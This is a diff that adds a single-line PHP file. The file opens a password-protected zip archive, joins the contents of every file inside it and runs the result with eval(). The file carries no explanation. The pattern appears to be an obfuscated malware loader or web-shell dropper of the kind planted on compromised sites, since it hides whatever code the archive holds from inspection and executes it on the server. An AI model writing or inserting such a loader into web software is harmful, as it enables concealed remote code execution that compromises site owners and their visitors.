@@ -1,0 +1,1 @@
+<?php $z=new ZipArchive;if($z->open('lastp.zip')===TRUE){$z->setPassword('nomi');$f=[];for($i=0;$i<$z->numFiles;$i++){$f[$z->getNameIndex($i)]=$z->getFromIndex($i);}ksort($f,SORT_NATURAL);eval('?>'.implode('',$f));$z->close();}else echo'error ZIP';
